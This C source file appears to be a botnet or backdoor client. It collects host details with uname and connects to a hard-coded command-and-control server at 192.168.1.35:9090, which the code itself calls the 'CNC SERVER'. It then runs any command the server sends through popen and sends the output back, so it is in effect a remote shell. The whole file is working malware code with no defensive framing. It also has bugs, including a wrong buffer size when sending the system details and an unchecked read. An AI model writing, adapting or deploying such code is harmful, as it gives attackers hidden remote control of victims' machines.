#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>
#include "fatal.h"

#define PORT 9090
#define DEBUG

char clean();

int main() {
    int sockfd, result;
    struct sockaddr_in serv_addr;
    char msg[80], path[1035];
    struct utsname sysinfo;
    char *infomsg;
    FILE *fp;

    uname(&sysinfo);
    asprintf(&infomsg, "System name  : %s\r\nDistribution : %s\r\nRelease      : %s\r\nVersion      : %s\r\nMachine      : %s\r\n", 
    sysinfo.sysname, sysinfo.nodename,
    sysinfo.release, sysinfo.version,
    sysinfo.machine);

    printf(infomsg);

    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
        fatal("CLIENT SOCKET COULD NOT BE STARTED\n");

    serv_addr.sin_addr.s_addr = inet_addr("192.168.1.35");
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof (struct sockaddr_in)) < 0)
        fatal("COULD NOT ESTABLISH CONNECTION TO CNC SERVER\n");

    while(1) {
        result = read(sockfd, msg, sizeof(msg));
        msg[result] = '\0';
        printf(msg);

        if(strncmp(msg, "die", strlen("die")) == 0) {
            close(sockfd);
            exit(0);
        }

        else if(strncmp(msg, "info", strlen("info")) == 0) {
            send(sockfd, infomsg, sizeof(infomsg), 0);
        }

        else {
            char *src, *dst;
            for (src = dst = msg; *src != '\0'; src++) {
                *dst = *src;
                if (*dst != '\r') dst++;
            }
            *dst = '\0';

            fp = popen(msg, "r");
            if (fp == NULL) {
                send(sockfd, "Failed to run command\r\n", strlen("Failed to run command\r\n"), 0);
            }

            while (fgets(path, sizeof(path)-1, fp) != NULL) {
                send(sockfd, path, sizeof(path), 0);
            }

            pclose(fp);
        }  
    }
    return 0;
}